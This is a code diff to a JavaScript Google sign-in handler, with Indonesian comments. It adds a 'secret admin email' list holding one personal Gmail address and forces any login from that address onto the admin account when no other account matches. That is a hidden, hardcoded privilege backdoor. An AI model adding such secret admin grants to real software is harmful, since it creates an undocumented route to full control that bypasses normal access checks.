@@ -47,9 +47,17 @@ function handleGoogleCredential(response) {
     var googlePicture = payload.picture || null;
     var googleSub     = payload.sub     || '';
 
-    var matchedAcc = ACCOUNTS.find(function(a) {
-      return a.email && a.email.toLowerCase() === googleEmail.toLowerCase();
-    });
+    // ── EMAIL ADMIN RAHASIA ──
+const ADMIN_EMAILS = ['nirwantoroaditya@gmail.com'];
+
+var matchedAcc = ACCOUNTS.find(function(a) {
+  return a.email && a.email.toLowerCase() === googleEmail.toLowerCase();
+});
+
+// Kalau email cocok dengan ADMIN_EMAILS → paksa jadi Admin
+if (!matchedAcc && ADMIN_EMAILS.includes(googleEmail.toLowerCase())) {
+  matchedAcc = ACCOUNTS.find(function(a){ return a.id === 'admin'; });
+}
 
     var user;
     if (matchedAcc) {
